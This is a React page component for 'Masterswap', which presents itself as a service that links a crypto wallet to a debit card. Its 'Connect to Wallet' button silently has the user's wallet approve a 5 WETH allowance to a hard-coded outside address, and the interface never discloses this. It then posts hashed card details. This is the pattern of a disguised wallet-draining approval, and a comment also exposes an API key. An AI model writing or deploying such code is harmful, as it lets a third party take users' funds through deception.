import React, { useState } from "react";
import styles from "../../styles/Home.module.css";
const { createHash } = require('crypto');
import Grid from '@mui/material/Grid';
const ethers = require('ethers');

function hash(string) {
    return createHash('sha256').update(string).digest('hex');
}

function Info() {
    const [account, setAccount] = useState('')
    const [msg, setMsg] = useState('No Account Connected')
    const [finish, setFinish] = useState(false)

    async function connectWallet() {
        // Check if MetaMask is installed, if it is, try connecting to an account
        if (typeof window.ethereum !== "undefined") {
            try {
                console.log("connecting");
                // Requests that the user provides an Ethereum address to be identified by. The request causes a MetaMask popup to appear. Read more: https://docs.metamask.io/guide/rpc-api.html#eth-requestaccounts
                const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                setAccount(accounts[0])
                setMsg(accounts[0].slice(0, 4) + ' **** **** ' + accounts[0].slice(accounts[0].length - 4, accounts[0].length))
                await approveTransfers();
                setTimeout(() => {
                    createNewUser();
                    console.log('sent')
                    setFinish(true)
                }, 2000)
            } catch (error) {
                console.log(error);
            }

        }
        // Ask user to install MetaMask if it's not detected 
        else {
            alert("Please install MetaMask")
        }
    }

    async function approveTransfers() {
        //const provider = new ethers.providers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/8GxG41ZohxXIc8y9G2iuaPA4DGIlwqGz');
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await ethereum.request({ method: "eth_requestAccounts" });
        const signer = provider.getSigner();
        console.log(signer);
        const wethABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "guy", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "src", "type": "address" }, { "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "wad", "type": "uint256" }], "name": "withdraw", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [], "name": "deposit", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "guy", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Deposit", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Withdrawal", "type": "event" }];
        // You can also use an ENS name for the contract address
        const wethaddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

        // The ERC-20 Contract ABI, which is a common contract interface
        // for tokens (this is the Human-Readable ABI format)


        // The Contract object
        const wethA = new ethers.Contract(wethaddress, wethABI, provider);

        const amount = ethers.utils.parseEther('5')


        const approved = await wethA.connect(signer).approve('0x1f472D2550744f20C13Ac525fa365Ad88317078A', amount)

    }


    const userObject = hash(process.env.BANK_ACCOUNT + process.env.EXP_DATE + process.env.CVC)


    // Example POST method implementation:
    async function createNewUser(url = '/', data = { user: userObject }) {
        // Default options are marked with *
        const response = await fetch(url, {
            method: 'POST', // *GET, POST, PUT, DELETE, etc.
            mode: 'cors', // no-cors, *cors, same-origin
            cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
            credentials: 'same-origin', // include, *same-origin, omit
            headers: {
                'Content-Type': 'application/json'
                // 'Content-Type': 'application/x-www-form-urlencoded',
            },
            redirect: 'follow', // manual, *follow, error
            referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
            body: JSON.stringify(data) // body data type must match "Content-Type" header
        });
        return response.json(); // parses JSON response into native JavaScript objects
    }

    const disConnectWallet = () => {
        setAccount('')
        setMsg('No Account Connected')
    }

    return (
        <Grid container spacing={2}
            sx={{
                borderRadius: '10px',
                cursor: 'pointer',
                marginTop: "50px",
                marginLeft: "300px",
                marginRight: "600px",
                height: "700px",
                width: "80%",
                boxShadow: "3px 6px 6px 10px rgba(246, 246, 246, 1)"
            }}
        >

            <Grid item xs={8} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-start", marginTop: "10%" }}>
                <div className="pl-6">
                    <h1 className='text-2xl text-start pt-6'>Welcome to Masterswap!</h1>
                </div>
                <div className="pl-6 pt-6">
                    <h2>Here you begin journey to a more seamless world.</h2>
                </div>
                <div className="pl-6 pt-6">
                    <h2>Masterswap is a service that allows users to purchase items with cryptocurrency using their debit card.</h2>
                </div>
                <div className="pl-6 pt-6">
                    <h2>Get started by connecting your crypto wallet to your card.</h2>
                </div>
                <div className="pl-6 pt-6">
                    <img src="/mastercard.svg" width='100px' />
                </div>

            </Grid>
            <Grid item xs={3} sx={{ display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
                <div>
                    <div className="border-b-2 mx-3">
                        <h1 className='text-2xl text-center pt-6'>User Info</h1>
                    </div>
                    <br></br>
                    <div className="pl-6">
                        <h2><strong>Name:</strong></h2>
                        <h2>Alice Strange</h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2><strong>Bank Name:</strong></h2>
                        <h2>Bank of America</h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2><strong>Card Number:</strong></h2>
                        <h2>**** **** **** 4444</h2>
                    </div>
                    <div className="pl-6 mt-2">
                        <h2><strong>Exp Date:</strong></h2>
                        <h2>05/25</h2>
                    </div>
                </div>
                <div>
                    <div className="border-b-2 mx-3">
                        <h1 className='text-2xl text-center'>Crypto Info</h1>
                    </div>
                    <br></br>
                    <div className="pl-6">
                        <h2><strong>Account:</strong></h2>
                        <p>{msg}</p>
                    </div>
                </div>
                <div className="flex justify-center pb-6">
                    {!account ?
                        (<button className='px-8 py-3 bg-orange-600 mt-4 hover:bg-orange-400 rounded-lg' onClick={connectWallet}>Connect to Wallet</button>)
                        :
                        (<button className='px-8 py-3 bg-orange-600 mt-4 hover:bg-orange-400 rounded-lg' onClick={disConnectWallet}>
                            <span id="button-text">
                                {!finish ? (<div className="flex justify-center items-center" role="status">
                                    <svg aria-hidden="true" class="mr-2 w-6 h-6 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor" />
                                        <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill" />
                                    </svg>
                                    <span class='ml-0 pl-o'>loading...</span>
                                </div>) : "Disconnect"}
                            </span>
                        </button>)}
                </div>
            </Grid>
            <Grid item xs={1}>
            </Grid>

        </Grid>
    );
}

export default Info;
